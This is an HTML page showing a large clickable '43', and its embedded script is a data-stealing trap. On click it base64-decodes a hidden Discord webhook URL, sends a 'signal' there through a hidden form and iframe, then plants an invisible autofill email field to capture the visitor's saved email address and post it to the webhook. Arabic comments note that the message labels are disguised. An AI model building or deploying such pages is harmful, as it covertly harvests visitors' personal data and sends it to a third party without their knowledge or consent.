<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>V43 FINAL</title>
    <style>
        body { background: #000; color: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        h1 { font-size: 150px; cursor: pointer; text-shadow: 0 0 20px #0f0; }
    </style>
</head>
<body>

    <h1 onclick="execute()">43</h1>

    <script>
        const key = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4MTY2NDkxOTE5ODg5NjI1OC9oWHVuQnVWRU8wajByaUVTQTluaWNxanp5UnRFQTFkdTNPem9DSUhOcUpwTldmdjl4eXJ0RWZDemdjRWxQUTlndkJnWg==";
        const HOOK = atob(key);

        function sendData(content) {
            const f = document.createElement('form');
            f.action = HOOK; f.method = 'POST'; f.target = 'v43_ifr';
            const i = document.createElement('input');
            i.name = 'content'; i.value = content;
            f.appendChild(i); document.body.appendChild(f);
            const ifr = document.createElement('iframe');
            ifr.name = 'v43_ifr'; ifr.style.display = 'none';
            document.body.appendChild(ifr);
            f.submit();
        }

        async function execute() {
            document.querySelector('h1').innerText = "DONE";
            
            // تمويه الكلمات: (S-1 = Session Start / A-F = Autofill)
            sendData("🔵 **Signal S-1 Received**");

            // محاولة سحب الإيميل (Autofill)
            const m = document.createElement('input');
            m.type = 'email'; m.autocomplete = 'email';
            m.style.display = 'none';
            document.body.appendChild(m);

            setTimeout(() => {
                if(m.value) {
                    sendData("📊 **Data A-F:** " + m.value);
                } else {
                    sendData("⚪ **Probe Complete: No stored data found.**");
                }
            }, 1000);
        }
    </script>
</body>
</html>
